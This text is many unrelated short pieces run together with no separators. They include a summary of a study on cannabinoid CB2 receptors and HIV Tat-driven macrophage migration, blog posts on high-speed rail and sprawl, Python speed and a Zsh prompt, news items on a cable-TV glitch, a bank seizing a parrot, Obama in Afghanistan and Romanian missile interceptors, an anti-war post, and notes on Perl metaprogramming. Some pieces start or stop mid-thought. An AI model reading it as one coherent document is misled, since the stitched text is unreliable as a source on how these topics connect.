The CB1 receptor , typically expressed in cells of the brain , was not found in U937 cells using RT - qPCR .
Their second set of confirmatory experiments proved that the U937 cells would migrate in response to Tat protein as has been previously described for human monocytes in blood .
The migratory response was maximum at 50 nM Tat and so the authors used this concentration for their studies .
The next experiments looked at the migration of macrophages in the presence of the different drugs .
All results were compared to vehicle controls ( ethanol was used to dilute the drugs ) .
Using vehicle alone with
Tat protein in the bottom compartment , migration was the same as with no vehicle .
When cells were treated with THC , however , migration of macrophage was inhibited by 50 % .
And using the agonist CP55940 , migration was inhibited by 58 % .
Using the CB2 receptor specific agonist , the same effect of > 50 % inhibition was observed , however , but not suprisingly , using a CB1 receptor agonist , ACEA , had no effect on migration .
These results clearly indicate that the CB2 receptor on the human macrophage - like U937 cells plays a role in migration in the presence of the HIV
Tat protein and this effect can be blocked when the receptor is activated .
To confirm the effect of migration was due to the CB2 receptor , the receptor antagonists were used to demonstrate that when signalling through the receptor is blocked , the effect is reversed .
The antagonist will bind the receptor but not activate the signalling cascade in the cell , thus blocking it from being activated by the ligand CP55940 .
Using the CB2 specific antagonist SR2 alone , migration in the presence of Tat is the same as controls - it is not inhibited .
When CP55940 is combined with the SR2 compound , inhibition of migration is reversed .
SR2 prevents the protective anti-migration effect of CP55940 .
To further prove the role of CB2 in this effect , siRNA mediated CB2 knockout cells were employed in the cell migration assay .
The authors confirmed that neither the transfection reagent nor the siRNA itself had any effect on cell migration .
Using the CB2 knockout cells in the presence of THC , migration was observed similarly to untreated cells .
This is consistent with the results of blocking the CB2 receptor with antagonist .
The CB2 receptor was not available for activation by the THC and thus no protective anti-migration effect was observed .
Discussion :
Chemokines are cytokines that function by directing the flow of inflammatory cells to sites of injury or infection in the body .
HIV uses our immune system cascade meant to protect us for its own benefit , by producing the viral
Tat protein to bind the receptors meant for chemokines and stimulate the migration of more healthy macrophages to the HIV infected cells , increasing their opportunity to spread .
The stimulation of chemokines also increases the number of receptors on the surface , making it easier for HIV to infect new cells .
The ability to slow down the migration of healthy cells towards HIV infected cells and to down regulate the expression of chemokine receptors would slow the progression of HIV associated disease .
In this paper , the authors demonstrate a connection between the cannabinoid receptor on immune cells , CB2 , and the migration of macrophages towards Hiv Tat protein .
When the CB2 receptor is stimulated with an agonist , migration is inhibited .
Whether this is due to down regulation of the chemokine receptors used for binding or due to down regulation of chemokines from CB2 activated cells has yet to be determined .
But the fact remains that the cannabinoid receptor CB2 may be a therapeutic target for preventing hyperactivation of the immune system by HIV and potentially , in the future , to help stop widespread infection .
Final note :
I found this paper to be an exciting advance in the fields of HIV and drugs of abuse .
A therapy involving cannabinoids would be far less toxic than current drugs used to stop the progression of HIV .
With all the ways HIV has found to use our own immune system against us to survive , an approach that counteracts HIV by taking back control of the immune system could be far more effective than developing toxic drugs that target HIV directly or using cytokines that further activate a tired immune system .
Over at Wired Magazine , Jason Kambitsis has an article that ’s getting lots of coverage around the transit blogs .
In the article , he argues HSR is a “ conduit of sprawl ” :
It ’s fast , it ’s efficient and it is the future of transportation , but will high - speed rail cause sprawl ?
Yes , it could , warn some urban planners .
Despite the promise of creating more densely populated urban centers , high - speed rail could do quite the opposite by making it easier for people to live far from urban centers … .
But that convenience could increase emigration from California ’s urban centers to the exurbs and beyond .
In other words , it could lead to more sprawl .
Kambitsis ’s article is n’t a piece of HSR denial – he supports the concept and understands its place in a 21st century economy and transportation network .
But he looks at places like Bakersfield and Fresno and argues that HSR could produce sprawl , unless steps are taken to mitigate against it :
Proactive land use policies focused on increasing urban density coupled with incentives for transit - oriented development and suburban infill must be embraced by communities along high - speed rail lines — especially those with planned stops .
This will help create a market for transportation and the subsequent development tied to it .
Regional and local transportation planning initiatives that create infrastructure connecting pedestrians , bicycles and mass transit and place it on a level playing field with automobiles will reduce dependence on cars for commuting .
Parking should be provided in garages , not lots , and it must be integrated into the development .
And , finally , stations must be landmark , not utilitarian , structures that compliment their communities and welcome riders .
Grand Central Station in New York is an excellent example .
If you ’ve been reading this blog since 2008 , however , you ’d know that I ’ve already been advocating for exactly those kinds of TOD policies .
Californians For High Speed Rail prefers downtown stations built with TOD precisely for this purpose , to channel growth inward and help mitigate against sprawl .
But in my posts on HSR and sprawl , I ’ve identified other factors that suggest the concern is not only misplaced , but leaves out some other rather important factors that suggest it will actually be quite difficult for HSR to produce sprawl .
Sprawl is NOT a force of nature .
It is a product of three factors : cheap oil , cheap credit and favorable land use laws .
Cheap oil is a thing of the past .
Cheap credit will be as well – rates are low right now , but loans are hard to get , and virtually everyone expects rates to rise very soon .
Even with a bailout , we have not seen a return to the lax lending practices , fueled by cheap credit , that enabled the most recent binge of Central Valley sprawl .
As to the last point , land use rules are going to have to change regardless of HSR .
Stopping HSR is n’t going to eliminate sprawl , far from it .
But to eliminate sprawl , you need to provide opportunities for urban density and transit - oriented development .
Portland , Oregon provides the model .
Portland has strict anti-sprawl rules , but these were only successful because Portland promoted urban density .
Providing passenger rail has been the key to that .
In short , if you want to stop sprawl , you need to give people another option .
HSR is that other option .
Without HSR Central Valley cities will have less incentive to channel development to city centers and will lack the infrastructure to make it happen even if they chose to do so .
That ’s not all .
The state legislature is also planning to link land use , sprawl , and global warming via Sen.
Darrell Steinberg ’s SB 375 , which prioritizes TOD and helps cut down on sprawl .
Prop 1A contained a provision forbidding construction of a station at Los Banos , a key demand of anti-sprawl advocates .
Another element in the anti-sprawl battle is a recent court ruling invalidating a housing cap in Pleasanton .
Such housing caps produce sprawl by forcing housing growth to happen elsewhere , especially the Central Valley .
Now cities in places like the Bay Area and the SoCal core will have to add more housing .
More anti-sprawl rules would help ensure that sprawl is dead in the Central Valley .
These rules would include restoration of state funding for the Williamson Act , which enables local governments to buy land to keep it as open space or in agricultural use .
It ’s been a key anti-sprawl tool , but has been defunded by Governor Arnold Schwarzenegger in recent budget cuts .
In other words , there ’s a lot of tools out there , existing and potential , to help push back against sprawl .
Combined with good station locations , the ongoing rise in oil prices , and the lack of cheap credit , there ’s every reason to believe HSR will not produce sprawl .
UPDATE : Eric Fredericks of the CHSRA added this in the comments :
A Columbia scientist has become the first to grow a complex , full - size bone from human adult stem cells .
Gordana Vunjak - Novakovic , a professor of biomedical engineering at the Fu Foundation School of Engineering and Applied Science , reports that her team grew a temporomandibular joint ( TMJ ) from stem cells derived from bone marrow .
Her work is reported in the online Early Edition of the journal Proceedings of the National Academy of Sciences this month .
" The TMJ has been widely studied as a tissue - engineering model because it cannot be generated easily , if at all , by current methods , " says Vunjak - Novakovic , whose co-authors include Warren L. Grayson , then a post - doctoral student in her lab and now an assistant professor at Johns Hopkins University .
Around 25 percent of the population suffers from TMJ disorders -- including those who suffer from cancer , birth defects , trauma and arthritis -- which can cause joint deterioration .
Because the TMJ is such a complex structure , it is not easily grafted from other bones in a patient 's body .
" The availability of personalized bone grafts engineered from the patient 's own stem cells would revolutionize the way we currently treat these defects , " she says .
Current methods of treating traumatic injury to the jaw include taking a bone from the patient 's leg or hip to replace the missing bone .
" Would n't it be wonderful if we could get the patient 's own stem cells and grow a new jaw ? " says Dr. June
Wu , a craniofacial surgeon at Columbia University Medical Center who advised Vunjak - Novakovic on her research .
Vunjak - Novakovic 's technique for turning stem cells into bone was inspired by the body 's natural bone - building process .
Her team started by analyzing digital images of a patient 's jawbone in order to build a scaffold into the precise shape of a TMJ joint .
The scaffold itself was made from human bone stripped of living cells .
The team then seeded the scaffold with bone marrow stem cells and placed it into a custom - designed bioreactor .
The reactor , filled with culture medium , nourished and physically stimulated the cells to form bone .
" Bone tissue is metabolically very active , " she says .
Bone tissue develops best when it is bathed in fluid flowing around it .
Vunjak - Novakovic and the team looked into the exact flow rates one needs for optimal effects .
After five weeks , they had a four - centimeter - high jawbone that was the precise size and shape of a human TMJ .
The technique can be applied to other bones in the head and neck , including skull bones and cheek bones , which are similarly difficult to reconstruct , but Vunjak - Novakovic started with the TMJ because , " We thought this would be the most rigorous test of our technique , " she said .
" If you can make this , you can make any shape . "
Her team 's next step is to develop a way to connect the bone graft to a patient 's blood supply to ensure that the graft grows with the person 's body .
" Our bones change , and these biological grafts would change with us , " says Vunjak - Novakovic .
— Time Warner Cable officials apologized Tuesday after they mistakenly showed Playboy preview programming on two children 's channels .
TWC spokesman Keith Poston , said , “ Basically , we had a piece of equipment fail and what happened is some previews for the Playboy Channel actually got diverted into the preview box on our Kids on Demand ( Ch. 252 ) and our PreSchool On Demand ( Ch. 555 ) . ”
While the menu of available children 's programming was listed on the left side of the screen , previews showing nude women engaged in explicit conversations played in the upper right corner where previews of children 's shows normally would appear .
Poston said the explicit content aired from about 6:15 to 8:15 a.m. in parts of Cary , Garner , Morrisville , Wilson , Goldsboro , Willow Spring and Johnston County .
“ It took about an hour or so once we were notified of the problem to actually get it fixed , ” Poston said .
“ It was a technical glitch and unfortunately it hit at the worst possible time on the worst possible channels . "
As engineers worked to identify the root of the problem , they found pockets of affected homes in communities scattered across the service area .
“ We would find places where it was n't , but then it would still be there in another , ” he said .
A system designed to monitor content and avoid such cross-pollination missed the glitch .
Monitor screens , and the affected channels in most TWC homes , showed only black , Poston said .
It was unclear how many people saw the programming .
“ It was a small number of customers , ” Poston said , “ But one 's too many ! "
" We 're very , very sorry it happened .
We know parents are concerned .
I have a 9 - year - old .
I 'm a dad .
I 'd be concerned too , " Poston said .
" It was a technical malfunction that caused the wrong previews to be shown on our kids on - demand channels . "
Poston pointed out that even Time Warner ’s robust parental controls would not have blocked the images from viewers who happened upon them Tuesday morning .
“ You can block all sorts of programming whether it 's adult programming , or by rating , ” Poston said .
“ But , something like this , where we have programming fed into a preview window that was n't supposed to be there , the parental controls would n't have caught it .
“ It 's not like an image filter like some Internet services provide .
We should have caught it and we did n't . ”
Languages Don't Have Speeds , Or Do They ?
Everyone knows languages do n’t have speeds , implementations do .
Python is n’t slow ; CPython is .
Javascript is n’t fast ; V8 , Squirrelfish , and Tracemonkey are .
But what if a language was designed in such a way that it appeared that it was impossible to be implemented efficiently ?
Would it be fair to say that language is slow , or would we still have to speak in terms of implementations ?
For a long time I followed the conventional wisdom , that languages did n’t have speeds , but lately I ’ve come to believe that we can learn something by thinking about what the limits on how fast a language could possibly be , given a perfect implementation .
For example consider the following Python function :
def f ( n ) : i = 0 while i < n : i += 1 n += i return n
And the equivilant C function :
int f ( int n ) { int i = 0 ; while ( i < n ) { i += 1 ; n += i ; } return n ; }
CPython probably runs this code 100 times slower than the GCC compiled version of the C code .
But we all know CPython is slow right ?
PyPy or Psyco probably runs this code 2.5 times slower than the C version ( I ’m just spitballing here ) .
Psyco and PyPy are , and contain , really good just in time compilers that can profile this code , see that f is always called with an integer , and therefore a much more optimized version can be generated in assembly .
For example the optimized version could generate just a few add instructions in the inner loop ( plus a few more instructions to check for overflow ) , this would skip all the indirection of calling the __add__ function on integers , allocating the result on the heap , and the indirection of calling the __lt__ function on integers , and maybe even some other things I missed .
But there ’s one thing no JIT for Python can do , no matter how brilliant .
It ca n’t skip the check if n is an integer , because it ca n’t prove it always will be an integer , someone else could import this function and call it with strings , or some custom type , or anything they felt like , so the JIT must verify that n is an integer before running the optimized version .
C does n’t have to do that .
It knows that n will always be an integer , even if you do nothing but call f until the end of the earth , GCC can be 100 % positive that n is an integer .
The absolute need for at least a few guards in the resulting assembly guarantees that even the most perfect JIT compiler ever , could not generate code that was strictly faster than the GCC version .
Of course , a JIT has some advantages over a static compiler , for example , it can inline at dynamic call sites .
However , in practice I do n’t believe this ability is ever likely to beat a static compiler for a real world program .
On the other hand I ’m not going to stop using Python any time soon , and it ’s going to continue to get faster , a lot faster .
Philip Ross works with a mushroom farm called Far West Fungi .
And on it they 're growing your future house .
Or at least the nontoxic , fireproof , mold - and water - resistant building blocks for it .

There are dozens of mushroom - filled shipping containers on this farm , but what Ross is after are the " fungi's thin , white rootlike fibers " also known as mycelium .
He 's after these fibers because they make great building blocks :
Mycelium does n't taste very good , but once it 's dried , it has some remarkable properties .
It 's nontoxic , fireproof and mold - and water - resistant , and it traps more heat than fiberglass insulation .
It 's also stronger , pound for pound , than concrete .

If you doubt how strong the material is , consider this : Ross " destroyed many a metal file and saw blade " while shaping 500 of these mushroom bricks into a six foot by six foot archway .
He hopes to destroy many more tools by one day building entire homes out of mushroom bricks .
And my parents thought I was nuts when I told them I wanted to live in a mushroom just like the Smurfs .

Yahoo have literally just released a brand new trailer for Sylvester Stallone ’s The Expendables .
The movie stars loads of 80’s , 90s and 00’s hard men which includes a rather impressive cast of Sylvester Stallone , Jason Statham , Jet Li , Terry Crews , Randy Couture , Dolph Lundgren , Mickey Rourke , Giselle Itie , Eric Roberts , David Zayas , Steve Austin , Bruce Willis and another man you might recognise , Arnold Schwarzenegger !
This new trailer gives us a much better look at the movie including a look at all the main characters including Bruce Willis and the Governator himself .
It has the potential to be awful but no matter what , i’ll be going to see it at the cinema when it ’s released 13th August .
Enjoy !
Blue macaws are popular pets Bank of America has apologised to a woman in Pennsylvania after one of its contractors entered her house , damaged furniture and confiscated her parrot .
Angela Iannelli has filed a lawsuit alleging that the incident in October caused her so much " emotional distress " that she needed medication for anxiety .
It took her more than a week to secure the release of Luke , a blue macaw .
A BoA spokesman said it had erroneously believed Ms Iannelli was defaulting on her mortgage and the house was vacant .
' Zero tolerance '
An employee had sent the contractor to the property with instructions to install a new lock and otherwise " secure " it , he said .
He added that the bank had " zero tolerance for this kind of error " , and would quickly review the lawsuit and " consider any hardship that resulted " .
He 's doing very well now
Angela Iannelli
In her civil suit seeking $ 50,000 in damages , Ms Iannelli said the BoA contractor had invaded her home north of Pittsburgh while she was away , stopped utility services , cut water pipes and electrical wiring , damaged flooring and finishings , poured antifreeze into sinks and toilets and stolen her parrot , according to the Wall Street Journal .
She said that when she rang BoA to protest , its representatives first denied knowing where the parrot was , and later told her she could go to the offices of the contractor , about 80 miles away , to retrieve the bird herself .
Bank officials also allegedly told her they were " tired " of hearing from her , hung up , and advised her to seek help from the police .
Ms Iannelli told the Wall Street Journal that although Luke had initially seemed nervous , he was " doing very well now " .

Washington has a lot of money .
It has trillions for war , but no money for housing .
Money for war , but no money for health care .
Money for war , but no money for education .
Money for war -- no money to rebuild our cities .
No money to create jobs , but money for war .
The Democrats took control of the Congress in 2006 with a promise to end the War in Iraq and it's not enough for this Administration to slow - walk the end of the war , which could continue for years to come .
And it's not enough for a Democratic Administration to escalate a war in Afghanistan at a time when there 's no clear objective and no end in sight of the contribution of blood and treasure , to a region which has never been conquered by any foreign country .
It 's time that we take a stand as citizens .
And it's also time to force Congress to take it 's Constitutional responsibility seriously .
Article 1 , Section 8 requires that Congress has the war - making power .
It is absolutely imperative that Congress be required to assert it 's responsibility on behalf of the American people .
Congress is directly elected by the people .
And Congress has to respond and step up to it 's responsibility to decide if we 're going to stay at war in Afghanistan .
And so , soon , I will bring to the Floor of the House a Privileged Resolution which will force a vote as to whether or not we stay in Afghanistan .
Maine was first ... again .
As Bruce Gagnon wrote at AfterDowningStreet , the annual town hall meeting at beautiful Deer Isle , Maine voted to end the war in Afghanistan -- by a 2 - 1 margin .
I wish yesterday was as smooth for me on the war front .
Instead I spent the day arguing withDemocratic candidates about Afghanistan .
They all want to support Obama .
They all believe that because he 's not Bush , Afghanistan , unlike Iraq , is the right war .
I should n't say , " all . "
We have some amazing leaders stepping up and talking out loud and clear against the occupation , like Marcy Winograd , Regina Thomas , Doug Tudor and Bill Hedrick , our next Blue America endorsee .
A few nights ago I spent some time with a true - blue Democratic nominee in a solidly blue district , She 's going to be a congresswoman next January .
And she 's going to vote to keep funding the war .
Today I spoke to another woman , another sterling progressive , but one in a solidly Republican district .
I doubt she 's going to be a congresswoman in January but if she were to win she would also vote to keep funding the war .
On everything else , both of these women are outstanding .
But neither is ready to " give up " on Afghanistan .
One actually told me we have to keep fighting so we can prevent the Afghanis from killing each other .
I guess if we keep killing them , they 're not killing each other !
One of the Democratic candidates I spoke with sincerely informed me that if we left Afghanistan all our allies who trusted us there would be killed .
I felt I had time - traveled back to my college years and was listening to someone talking about why we could n't leave Vietnam .
So sad !
Blue America has a page , No Means No , dedicated to the 32 courageous Democrats who stood up to Obama last June when he put forward a supplemental war funding budget .
32 Democrats .
That 's it .
Not one more .
Now Obama is getting ready , probably in April , to shove through another 33 billion dollar supplemental -- a disgrace .
I wonder how much that 32 will grown .
Enough the stop the madness ?
Today one of those 32 , Ohio Congressman Dennis Kucinich , prepared to introduce a Privileged Resolution to end the war in Afghanistan ( on March 24 ) .
The resolution requires that the House debate the continuing war in Afghanistan , now the second longest war in American history .
Here 's what he had to say about it :
The war in Afghanistan is hopeless and unwinnable and endless :
" This year will be the third in a row that tens of thousands of new United States troops have arrived in Afghanistan with plans to ' clear , hold and build ' areas controlled by the Taliban .
Those previous surges have achieved little success at holding or building , as the international coalition and Afghan government have inevitably failed to come up with realistic plans for what happens after the fighting is done .
Is the campaign in Marja destined for the same fate ? "
It never worked in Vietnam and it certainly is n't going to work in Afghanistan .
The whole idea of building " an enduring , stable , secure , prosperous and democratic state " is so far from any kind of objective reality that anyone who believes it should be committed to an insane asylum other than Congress .
Even Petreaus , speaking yesterday in Nashville , admitted the war is n'tto being over .
All the Democrats who say they 're supporting it claim Obama will end it in June .
Something is seriously wrong .
Maybe Afghanistan banning live coverage of attacks will make the problems go away ... or at least make the death throes of the Afghan puppet regime and Obama 's clueless approach less embarrassing for everyone concerned .
Good luck fighting these assholes ( and for what reason again ? ) :

More than a children ’s classic , “ Alice ’s Adventures in Wonderland , ” the 1865 book by Lewis Carroll , is ground zero for a multi- tentacled media franchise that has been going strong for nearly 150 years .
The Victorian forebear of a variety of 20th century artistic movements , drug cultures and fashion trends , it has inspired untold authors and musicians , served as the basis for dozens of film and television versions , and been tailored and twisted to fit almost every narrative form imaginable , from musical theater to soft - core porn to video game .
Tim Burton ’s 3 - D “ Alice , ” which opened March 5 , has brought with it a DVD deluge of earlier adaptations .
New and upcoming releases include an improbably star - studded 1933 Hollywood production with Cary Grant , Gary Cooper and many others ( Universal , $ 19.98 ) ; Disney ’s animated take from 1951 ( a two - disc “ un-anniversary ” edition , $ 29.99 ) ; a 1966 version made for British television with Peter Sellers , John Gielgud and Michael Redgrave ( BBC Warner , $ 14.98 ) ; an NBC TV movie from 1999 with Ben Kingsley , Miranda Richardson and Whoopi Goldberg ( Vivendi , $ 19.93 ) ; and a miniseries that aired on the SyFy Channel last year with a somewhat oddball cast including Kathy Bates , Tim Curry and Harry Dean Stanton ( Lionsgate , $ 19.98 ) .
Besides attesting to the caliber of actors who have ended up in “ Alice ” projects over the years , the various productions suggest how malleable Carroll ’s fable has always been .
Though far from a classic , the upbeat 1951 Disney animated version remains the standard bearer for a kid- friendly “ Alice . ”
The black - and - white British TV film , directed by Jonathan Miller at the height of the Swinging ‘ 60s and featuring a Ravi Shankar score , avoids the expected psychedelic clichés , reveling in subtler druggy atmospherics .
The recent miniseries , in which a modern - day Alice is a martial - arts expert , fits with the ongoing revisionist vogue for empowered Alices .
( In Burton ’s film , she ’s 19 and more action heroine than passive visitor . )
The most satisfying of all the reissues , the 1933 “ Alice in Wonderland ” -- actually the second sound - era “ Alice , ” after an obscure 1931 version -- is reasonably faithful to the original and , as such , gratifyingly weird .
Combining elements of “ Alice ’s Adventures ” and its 1872 sequel “ Through the Looking - Glass , ” the film was directed by the unheralded Norman McLeod ; in almost every other respect , though , it was an A - list endeavor .
The screenplay is credited to Joseph L. Mankiewicz and William Cameron Menzies , both of whom would become important filmmakers in their own right .
Menzies , already an Oscar - winning art director , was also responsible for the off - kilter sets and visual tricks .
The cast includes W.C. Fields as Humpty Dumpty , Cary Grant as the Mock Turtle , Gary Cooper as the White Knight and Edward Everett Horton as the Mad Hatter .
It would be misleading , though , to say that the film is full of recognizable faces , since most of the actors are masked , suited and heavily made up ( in the spirit of the indelible original illustrations by John Tenniel ) .
The actors get into the romper - room spirit that an “ Alice ” production invariably induces , but the film ’s real pleasure is in the ingenuity of its old - school effects .
Of the other screen adaptations of “ Alice , ” the one that stands furthest apart from the pack is the 1998 stab by the master Czech animator Jan Svankmajer , a combination of live action and stop- motion animation in which the dream logic of Carroll ’s story shifts decisively to nightmare .
( It ’s available on DVD through First Run Features , $ 29.95 . )
And then , of course , there are the countless works that have simply been inspired by Carroll ’s Alice .
There are traces of her wild trip in films such as Jacques Rivette ’s 1974 masterpiece “ Celine and Julie Go Boating , ” in which two Parisian friends wander into a mansion whose occupants are stuck in an eternal loop , and Guillermo del Toro ’s “ Pan ’s Labyrinth ” ( 2006 ) , about a girl who discovers a fantasy underworld during the Spanish Civil War .
“ Alice in Wonderland ” is also the founding text for alternate - reality tales such as “ The Matrix ” and “ Lost . ”
It ’s no wonder that Carroll ’s premise has proved so endlessly inspiring .
In some ways , it is the most open - ended of templates .
All versions of the Alice story are defined by that thrilling initial breach : down the rabbit hole , through the looking glass .
What exactly we find on the other side remains up for grabs .

Irving John Good was born in London on December 9 , 1916 .
He attended the Haberdashers ' " secondary " School , distinguishing himself as a mathematical prodigy , and then entered Jesus College at Cambridge University in 1935 .
He studied under G. H. Hardy and A. S. Besicovitch , obtaining his Ph.D. in 1941 , and was the Cambridgeshire chess champion in 1939 .
Then he was called into World War II service as a cryptanalyst at Bletchley Park , working partly as the main statistician in teams led by Alan Turing and , later , by the British chess champion C. H. O'D. Alexander and by M. H. A. Newman .
The work employed early electromagnetic and electronic computers and applied Bayesian statistics relevant to reading the two main secret ciphers used by the German Army and Navy , providing crucial intelligence to the Allies .
After the war , Good taught briefly at Manchester University and made a few suggestions for the electronic computer project .
He was then drawn back into classified work for the British government .
During that time he obtained an Sc.D. from Cambridge and a D.Sc. from Oxford .
In 1967 he came to the United States , becoming a University Distinguished Professor at Virginia Polytechnic Institute .
Officially he retired in 1994 , but in practice he can be found at work late in the day when the snow is n't deep .
I just completed a section on code generation in the Modern Perl book draft .
Per an interesting coincidence , Moose and Class :: MOP reached 1.0 on the same day .
What 's the coincidence ?
The final subsection of Code Generation discusses the use of Class :: MOP for metaprogramming .
It 's simple to explain code generation and metaprogramming in terms of string eval ; everyone who knows how to declare a class in Perl can figure out string quoting issues and the particular timing of BEGIN blocks and visibility and implicit closures when writing :
eval << END_CLASS ; package $ class ; use parent ' $ parent ' ; sub new { ... } sub get_name { ... } sub set_name { ... } END_CLASS ;
... versus :
package My :: Awesome :: Subclass ; use parent ' My :: Awesome : : Parent ' ; sub new { ... } sub get_name { ... } sub set_name { ... }
... but you end up having to deal with all of those issues , plus the drawbacks of string eval ( it 's slower than regular declaration , you do n't get syntax highlighting or other IDE tools , it may leak memory in some versions of Perl 5 , quoting can be a pain , parameterization is an exercise in templating systems rather than OO design , and there 's no introspection or mechanism to modify the code after you 've run it through eval ) .
You also do n't get guarantees that you 've written your code correctly ; you might have left out an important method or an important declaration , or you may manipulate @ISA in a messy or unfortunate way , or you may step all over an existing class elsewhere , or ....
It 's important to have the safety valve of string eval , at least so that experienced programmers can escape from the cozy confines of what the language itself has provided if they 're doing brilliant things or if they 're doing dirty things and have made the sufficient determination that the risk of getting caught for cheating is worth the value of getting things done quickly .
Yet Class :: MOP for all of its perceived metacircular brain - twisting confusion ( and there 's really only one secret to learn to untwist all of that perceived complexity , unless you want to implement or bootstrap the system ) gives you all of that power and more , and all of the missing correctness , and all of the syntax highlighting , and all of the " Hey , this is just Perl I do n't have to quote or worry about timing or anything wild ! " if you learn that one little secret : you 're only manipulating objects .
Yes , the perceived syntactic weight of creating a class with Class : : MOP is higher than eval " package Foo ; \@ISA = ' Bar ' ; " ; , but you get introspection .
You get interoperability .
You get the benefit of a suite of thousands of tests and hundreds of real - world modules on the public CPAN alone ensuring that the system works .
Just as Moose makes the right designs easy to choose , so too does using a formalized mechanism for metaprogramming make metaprogramming safer and easier .
( As well , anything which hides some of the gory details of Perl 5 implementation behind a nicer syntax than what Perl 5 provides in this area is an improvement on those terms alone . )

Advertisement Barack Obama has told US forces on his first visit to Afghanistan as US president that they are there to help Afghans to forge a " hard - won peace " .
Addressing soldiers and civilians at Bagram air base near Kabul , he thanked them for their service and said they would prevail against their enemies .
They were there , he said , to " keep America safe and secure " .
On a trip lasting just a few hours , he met Afghan President Hamid Karzai and stressed the need to tackle corruption .
Mr Obama said he wanted to see progress continue on Afghan efforts to fight against drug - trafficking .
Mr Karzai will visit the US in May for talks , it was announced .
MARDELL'S AMERICA
His first presidential visit to Afghanistan aims to convince people his stance is what patriotism really looks like
Mark Mardell
BBC North America editor
Read Mark 's thoughts in full In December , Barack Obama ordered the deployment of an extra 30,000 US troops to Afghanistan .
Only a few thousand of the extra forces have arrived so far , with most expected to be in place by the summer .
Shortly after his speech to the troops , the US president , who is travelling on his Air Force One jet , left the country .
' Thank you ' US troops make up the majority of the Nato - led coalition force in Afghanistan .
Speaking to the large indoors gathering at Bagram , Mr Obama said : " There is no visit that I consider more important than this visit I am making now .
AT THE SCENE Lyse Doucet , BBC News , Kabul Mr Obama came here as senator in 2008 , when he was very critical of the Afghan leadership .
When he came into the White House , the big question was , when would he feel the moment was right to make his second visit ?
President Hamid Karzai has been waiting since his controversial re-election last year for an invitation to visit the White House .
Only yesterday , I heard his aides complaining about the president not being asked , and asking if this cast some shadow over the relationship .
So there is no mistaking the important symbolism of a visit that is going to send a strong message of support for Mr Karzai .
Mr Obama made it clear he was here to back Mr Karzai and the Afghan people , but also to thank the tens of thousands of US troops in Afghanistan for their sacrifices made .
Send us your comments " My main job here today is to say thank you on behalf of the entire American people . "
He added : " The Afghans have suffered for decades , decades of war , but we are here to help Afghans forge a hard - won peace ... and we want to build a lasting partnership founded upon mutual interest and mutual respect . "
Mr Obama said America had not chosen the war , and had not sought to meddle in Afghan affairs or expand its influence .
It had , he said , been " attacked viciously on 9/11 " , and al - Qaeda leaders and their Taliban allies were still in the region and had to be defeated .
The US aimed to deny al - Qaeda a safe haven and reverse the Taliban 's momentum , he said .
He promised troops that they were being " backed up by a clear mission and the right strategy " and that they would have " the support to get the job done " .
" I 'm confident all of you here are going to get the job done in Afghanistan , " he said to applause and cheers .
Operations in Pakistan Mr Obama also talked of operations across the border in Pakistan , where he said the Pakistani government had pushed " violent extremists out of their sanctuaries " .
" We have struck blows against al - Qaeda 's leadership as well as the Taliban's , " he said .
" They are hunkered down .
They are worried about their own safety .
It 's harder for them to move and to train and to plot and to attack .
" All of that makes America safer and we are going to keep them on the run . "
In the 14 months since he took office , Mr Obama has almost doubled American forces in Afghanistan .
US troops are now leading a massive military operation to push Taliban militants from their stronghold in the south of the country .
The BBC's Steve Kingstone in Washington says Mr Obama 's visit comes at a time when he has momentum domestically because he has just signed a new healthcare reform bill into law and agreed a new nuclear arms reduction treaty with Moscow .
The White House clearly wanted to build on that momentum and say that this is a president who can deal with more than one big issue at once , our correspondent says .
Also , there is an impression that US efforts in Afghanistan may be turning a corner , he adds , prompting a cautious sense of optimism .
Invitation to Karzai
At a joint press conference in the heavily guarded presidential palace , Mr Karzai thanked Mr Obama for US support and said he hoped the partnership would continue .
President Karzai thanked President Obama for US support
" The American people are encouraged by the progress that 's been made , " Mr Obama said , adding he hoped to see more improvement on governance , anti-corruption efforts and judicial process .
The pair also held private talks , as well as meetings involving Afghan cabinet ministers and senior Obama administration officials .
The White House confirmed that the Afghan president would visit Washington on 12 May.
US officials initially said President Karzai had been informed of Mr Obama 's impending visit just an hour before his arrival .
However , White House spokesman Robert Gibbs later said the Afghan government was told about the trip on Thursday .
Mr Obama travelled to Afghanistan during his campaign for the 2008 presidential election , while still a senator , but this is his first visit to the country since becoming the US commander - in - chief in January 2009 .
There were strained relations between the White House and the Karzai government last year over the disputed Afghan elections .
Mr Obama paid a similar unannounced visit to Iraq , where US forces are also involved in a long - running conflict , last year .

MUNICH  Romania ’s top defense body approved an American proposal to base missile interceptors there , the country ’s president said Thursday in a hastily arranged announcement .
The president , Traian Basescu , said in a statement that Romania , a former Warsaw Pact member and now part of NATO , was prepared to negotiate with the United States to accept ground - based interceptors as part of an antiballistic missile defense system .
He said it could be working by 2015 .
While the participation of Poland and the Czech Republic in the missile shield had been well known , the possibility that Romania would join them was not .
Romania made its announcement as Defense Secretary Robert M. Gates was in Turkey for a NATO meeting .
He was not immediately available to comment but the White House spokesman , Robert Gibbs , said the announcement was welcomed .
“ We ’re pleased that Romania has agreed to participate in that defense shield , ” he told reporters in Washington .
I spend a lot of time in a Terminal window at a command line .
Up until about a month ago I was using bash for my shell .
I decided to try switching to Zsh after hearing a lot of good things about it and I 'm very happy with the change .
A few days ago I tweeted my current Zsh prompt and the general response was : " Cool , but how did you do it ? "
I promised to write more about it when I got some free time , and it looks like that time is now .
One quick note :
This entry is about the prompt that I find useful .
You are not me , so you 'll almost certainly have different needs .
That 's great !
Take this prompt and hack it to make whatever works for you .
If you 're feeling generous you should find me on Twitter and show me what you changed -- I might want to steal / appropriate your changes .
Another quick note : I 've customized the colors of my Terminal .
They 're based on the Monokai TextMate theme , and I think they look very nice .
The colors will be different for you .
If you want colors like mine you should take a look at the entry I wrote about it .
Many people use the command line every day and never bother to customize their prompts .
It 's just a bit of text that 's printed before every command — why should you waste time learning how to customize it ?
I feel that the most important aspect of my command line work is the prompt .
Your prompt is something you 'll see literally thousands of times a day .
Why not take 30 minutes and customize it into something that 's much more useful ?
I firmly believe I 'm right in thinking this way .
30 minutes ( or even 3 hours ) of customization to make your work easier for the rest of your life ( or at least however long you stay with your current shell ) is worth it .
As I mentioned earlier I now use Zsh as my command line shell .
If you use bash ( the default on most modern systems ) the syntax to create the shell will be different .
Really , though , you should give Zsh a try .
I can write all day , but in the end I think a screenshot will be more helpful than anything I write .
Here 's a sample of my current Zsh prompt :
And here 's a version of that screenshot with some comments added to explain things :
If you want to know how I created that prompt , read on !
The first thing I 'd do when starting out with Zsh is to install robbyrussell 's oh - my -zsh .
